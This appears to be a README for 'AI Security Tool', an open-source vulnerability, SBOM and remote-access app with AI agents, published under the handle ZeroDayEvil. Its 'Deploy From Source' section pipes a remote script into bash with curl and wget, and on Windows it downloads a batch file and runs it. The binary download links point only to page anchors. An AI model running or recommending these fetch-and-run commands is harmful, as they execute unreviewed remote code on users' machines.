# AI Security Tool

**AI Security Tool** — бесплатный инструмент с открытым исходным кодом для поиска и анализа известных уязвимостей, работы с SBOM и управления локальными и удалёнными системами.

Инструмент объединяет **терминал, SSH/SFTP и другие протоколы удалённого доступа, анализ уязвимостей, SBOM, security workflows и AI-агентов** в одном приложении.

Работает как **настольное приложение и веб-приложение**, в том числе с мобильных устройств.

### Основные возможности

- 🔐 Поиск известных уязвимостей и анализ CVE
- 📦 Работа с SBOM и программными компонентами
- 🤖 Более 12 специализированных AI-агентов
- 🖥️ Терминал и удалённое подключение
- 🌐 Работа через браузер
- 📊 Отчёты в Console, JSON, CSV, HTML и PDF
- 🛡️ Security workflows, Bug Bounty и CTF
- ⚡ Автоматизация и интеллектуальное управление инструментами

**Полностью бесплатно и с открытым исходным кодом.**

[![Download Build](https://img.shields.io/badge/Download-Build-blue)](#download) [![Download Release](https://img.shields.io/badge/Download-Release-green)](#download)

---

<!-- BANNER -->

![AI Security Tool](https://zerodayevil.github.io/ai-security-tool/banner.png)

---

## 📑 Contents

- [What is AI Security Tool?](#what-is-ai-security-tool)
- [Vulnerability Intelligence](#vulnerability-intelligence)
- [SBOM & Component Analysis](#sbom--component-analysis)
- [AI Assistance](#ai-assistance)
- [AI Agents](#ai-agents)
- [Terminal & Remote Access](#terminal--remote-access)
- [Advanced Features](#advanced-features)
- [Web & Mobile](#web--mobile)
- [How It Works](#how-it-works)
- [Download](#download)
- [Deploy From Source](#deploy-from-source)
- [Build & Run](#build--run)
- [Server Deployment](#server-deployment)
- [Security](#security)
- [Contributing](#contributing)
- [Contact](#contact)

---

# What is AI Security Tool?

AI Security Tool was originally created as a personal security tool and has evolved into a full-featured open-source project.

The goal is to provide a single environment where you can:

- inspect local and remote systems;
- work with terminals and remote connections;
- identify software components;
- analyze known vulnerabilities;
- work with SBOM;
- generate security reports;
- automate security workflows;
- use AI to assist with security-related tasks.

The project is designed to be useful both as a **standalone application** and as part of **CI/CD and continuous security workflows**.

---

# Vulnerability Intelligence

AI Security Tool collects vulnerability information from multiple public vulnerability databases and security advisory sources:

- **NVD / CVE**
- **Red Hat**
- **OSV — Open Source Vulnerability**
- **GitLab Advisory Database (GAD)**
- **curl security advisories**

Vulnerability data is downloaded and stored locally.

By default, the databases are updated approximately **once per day**, rather than being downloaded every time a scan is started.

> The first download may take some time because the vulnerability databases can contain a large amount of data.

---

# SBOM & Component Analysis

AI Security Tool can identify software components and compare them against known vulnerabilities.

Two main workflows are supported.

### Detect components

The tool can create a component list, including versions, using a combination of:

- binary file analysis;
- programming-language dependency information;
- dependency manifests such as `requirements.txt`;
- other available component information.

### Analyze an existing SBOM

You can provide an existing SBOM in a supported standardized format and use it as the source for vulnerability analysis.

The tool then:

1. Reads the component list.
2. Identifies component versions.
3. Searches vulnerability databases.
4. Correlates components with known vulnerabilities.
5. Produces a vulnerability report.

---

# Vulnerability Analysis

AI Security Tool searches for known vulnerabilities affecting detected or imported components.

The results can contain information about:

- CVE identifiers;
- affected components;
- affected versions;
- vulnerability information;
- additional notes;
- information from previous reports;
- known remediation information.

Historical report data can be used to track how vulnerabilities change over time.

---

# Reports

Generate security reports in multiple formats:

- Console
- JSON
- CSV
- HTML
- PDF

This makes the results suitable for both interactive analysis and automated CI/CD workflows.

---

# AI Assistance

AI Security Tool supports integration with AI providers such as:

- OpenAI
- DeepSeek
- other compatible AI APIs

AI assistance can be used for:

- command suggestions;
- script generation;
- explaining terminal output;
- explaining security findings;
- assisting with security workflows;
- interacting with the available tools.

---

# AI Agents

AI Security Tool includes **more than 12 specialized AI agents** for different tasks and workflows.

### Core agents

| Agent | Description |
|---|---|
| `IntelligentDecisionEngine` | Selects tools and optimizes parameters |
| `BugBountyWorkflowManager` | Manages bug bounty workflows |
| `CTFWorkflowManager` | Assists with CTF workflows |
| `CVEIntelligenceManager` | Analyzes vulnerability information |
| `VulnerabilityCorrelator` | Detects relationships between vulnerabilities and potential attack chains |
| `TechnologyDetector` | Identifies the technology stack |
| `RateLimitDetector` | Detects request rate limiting |
| `FailureRecoverySystem` | Handles errors and recovery |
| `PerformanceMonitor` | Monitors and optimizes system performance |
| `ParameterOptimizer` | Performs context-aware parameter optimization |
| `GracefulDegradation` | Provides resilient operation when components fail |

Additional specialized agents may be added as the project evolves.

---

# Terminal & Remote Access

AI Security Tool can also be used as a terminal and remote connection client.

Supported connection types include:

- SSH
- SFTP
- Telnet
- Serial Port
- RDP
- VNC
- SPICE
- FTP

The application can also provide access to the local terminal when enabled.

### Remote access features

- Public-key authentication
- Password authentication
- SSH tunnels
- Remote file editing
- Global proxy
- Session proxy
- Quick commands
- Terminal themes
- Custom terminal backgrounds
- Transparent window on macOS and Windows
- Multiple terminal input
- Bookmark synchronization
- Theme synchronization
- Quick-command synchronization
- URL-based session initialization

### Remote file editing

Double-clicking a small remote file allows it to be opened directly for editing.

---

# Advanced Features

### Intelligent caching

Results can be cached using an **LRU-based caching system** to reduce repeated processing and unnecessary requests.

### Real-time process management

Monitor and manage processes in real time.

### Security analysis

Monitor CVEs and analyze vulnerability information.

### API Security Testing

Security testing support for:

- REST API
- GraphQL
- JWT

### Real-time visual interface

Modern dashboards provide:

- real-time status;
- progress tracking;
- security information;
- process monitoring.

### Global hotkey

A global hotkey can be used to show or hide the application window.

Default:

```text
Ctrl + 2
```

### Fast input

Send input simultaneously to multiple terminals.

### URL initialization

Initialize application sessions directly from a URL.

---

# Web & Mobile

AI Security Tool can run in two modes:

### Desktop

A native application for supported desktop platforms.

### Browser

The application can also run through a web browser.

The browser version can be used from desktop computers as well as mobile devices.

### Supported platforms

| Platform | Status |
|---|---|
| Windows | ✅ |
| macOS | ✅ |
| Linux | ✅ |
| Android | ✅ |
| HarmonyOS | ✅ |
| iOS | ✅ |

---

# How It Works

A typical vulnerability analysis workflow looks like this:

```text
        Vulnerability Databases
                  │
                  ▼
            Local CVE Data
                  │
                  ▼
       Component / SBOM Detection
                  │
                  ▼
        Component Correlation
                  │
                  ▼
       Vulnerability Analysis
                  │
                  ▼
               Report
```

The vulnerability databases are updated periodically.

The initial database download can take longer than subsequent updates.

---

# Download

AI Security Tool is **free and open source**.

Choose the appropriate package for your platform.

## Windows

### Installer — recommended

[Download `5.3.26-win-x64-installer.exe`](https://zerodayevil.github.io/ai-security-tool#5.3.26-win-x64-installer.exe)

### Portable version

[Download `5.3.26-win-x64.tar.gz`](https://zerodayevil.github.io/ai-security-tool#5.3.26-win-x64.tar.gz)

Extract the archive and run the application.

---

## macOS

### Apple Silicon

[Download `5.3.26-mac-arm64.dmg`](https://zerodayevil.github.io/ai-security-tool#5.3.26-mac-arm64.dmg)

For Macs with Apple Silicon processors such as M1, M2, M3 and newer.

---

## Linux

[Download `5.3.26-linux-x64.tar.gz`](https://zerodayevil.github.io/ai-security-tool#5.3.26-linux-x64.tar.gz)

For supported Linux distributions, extract the archive and run the application.

---

## Android

[Download `android-arm64-v8a-5.3.27.apk`](https://zerodayevil.github.io/ai-security-tool#android-arm64-v8a-5.3.27.apk)

For ARM64 Android devices.

---

## Other platforms

Additional builds are available for:

- HarmonyOS
- iOS

See the project's download page for the latest builds.

---

# Deploy From Source

## Linux / macOS

```bash
curl -o- https://github.com/ZeroDayEvil/ai-security-tool/scripts/one-line-web.sh | bash
```

or:

```bash
wget -qO- https://github.com/ZeroDayEvil/ai-security-tool/scripts/one-line-web.sh | bash
```

## Windows

```powershell
Invoke-WebRequest -Uri "https://github.com/ZeroDayEvil/ai-security-tool/scripts/one-line-web.bat" -OutFile "one-line-web.bat"

cmd.exe /c ".\one-line-web.bat"
```

> **Note:** Review installation scripts before executing them, especially when installing software from source.

---

# Build & Run

Build the application:

```bash
npm run build
```

Run the production server:

```bash
npm run prod
```

or:

```bash
./build/bin/run-prod.sh
```

Then open:

```text
http://127.0.0.1:5577
```

in your browser.

---

# Server Deployment

For server deployments, configure the `.env` file.

```env
ENABLE_AUTH=1
DISABLE_LOCAL_TERMINAL=1
SERVER_SECRET=some-server-secret
SERVER_PASS=some-login-password
```

### Configuration

`ENABLE_AUTH=1`

Enables authentication.

`DISABLE_LOCAL_TERMINAL=1`

Disables access to the local terminal.

This is recommended when running the application on a remote server.

`SERVER_SECRET`

Secret used by the server.

Use a strong, randomly generated value in production.

`SERVER_PASS`

Password used for authentication.

Use a strong password in production.

### Start the production server

```bash
./run-ai-security-tool-web.sh
```

### Nginx

Example configurations are available in:

```text
examples/nginx.conf
examples/nginx-ssl.conf
```

These can be used as a starting point for configuring domain access and HTTPS.

---

# 🔒 Security

> ⚠️ **Important:** AI Security Tool provides AI agents with potentially powerful access to local and remote systems.

Depending on configuration, agents may be able to interact with:

- terminals;
- files;
- network services;
- remote systems;
- security tools;
- scripts and commands.

### Production recommendations

When deploying AI Security Tool on a server:

- Enable authentication.
- Disable the local terminal when it is not required.
- Use HTTPS.
- Use a strong `SERVER_SECRET`.
- Use a strong server password.
- Restrict access with a firewall.
- Review the permissions available to AI agents.
- Monitor agent activity.
- Avoid granting unnecessary privileges.

**Do not expose an unauthenticated instance directly to the public Internet.**

AI-generated commands and scripts should be reviewed before being executed on production or otherwise sensitive systems.

---

# 🔄 CI/CD & Supply Chain Security

AI Security Tool can be integrated into continuous integration and delivery workflows.

A typical workflow can be:

```text
Build
  │
  ▼
Detect Components
  │
  ▼
Generate / Read SBOM
  │
  ▼
Check Vulnerability Databases
  │
  ▼
Match Known Vulnerabilities
  │
  ▼
Generate Report
  │
  ▼
Review / Fail Pipeline
```

This allows known vulnerabilities in software dependencies and components to be identified earlier in the development and deployment lifecycle.

---

# 🤝 Contributing

AI Security Tool is free and open source.

Contributions, bug reports, ideas and improvements are welcome.

## Priority areas

### 🤖 AI Agents

- New AI providers
- New models
- New agents
- New security workflows

### 🛠️ Security Tools

Integration of additional security and vulnerability analysis tools.

### ⚡ Performance

- Better caching
- Performance optimization
- Scalability improvements

### 📖 Documentation

- Usage examples
- AI-agent documentation
- Integration guides
- Tutorials

### 🧪 Testing

- Automated tests
- Integration tests
- AI-agent workflow testing
- Cross-platform testing

### 🐛 Bug Fixes

Bug reports and pull requests are welcome.

---

# 🐞 Bug Reports & Feature Requests

If you find a bug or want to request a feature, please open an issue in the GitHub repository.

When reporting a bug, please include:

- AI Security Tool version
- Operating system
- Steps to reproduce the problem
- Expected behavior
- Actual behavior
- Relevant logs

**Do not include passwords, API keys, private keys or other sensitive information in public issues.**

---

# 🛡️ Security Vulnerabilities

Please **do not publicly disclose serious security vulnerabilities through GitHub Issues**.

Use the project's private security reporting process instead.

See [`SECURITY.md`](SECURITY.md) for information about reporting vulnerabilities.

---

# 📄 License

AI Security Tool is free and open-source software.

See [`LICENSE`](LICENSE) for the license and terms of use.

---

# 📞 Contact

### Project

**GitHub:**  
https://github.com/ZeroDayEvil/ai-security-tool

**Website:**  
https://zerodayevil.github.io/ai-security-tool

### Telegram

**Admin:**  
https://t.me/ZeroDayEvil

**Community Chat:**  
https://t.me/ZeroDyaTool_chat

**News Channel:**  
https://t.me/ZeroDyaTool_channel

### Other Projects

https://github.com/ZeroDayEvil

### Support the Project

If you would like to support the development of AI Security Tool:

**OpenCollective:**  
https://opencollective.com/ZeroDayEvil

---

# ⭐ Support the Project

AI Security Tool is completely free and open source.

If you find it useful, you can support the project by:

- ⭐ Starring the repository
- 🐛 Reporting bugs
- 💡 Suggesting features
- 🔧 Contributing code
- 📖 Improving documentation
- 🧪 Adding tests
- 📢 Sharing the project

Every contribution helps improve the project and make it more useful for the security community.
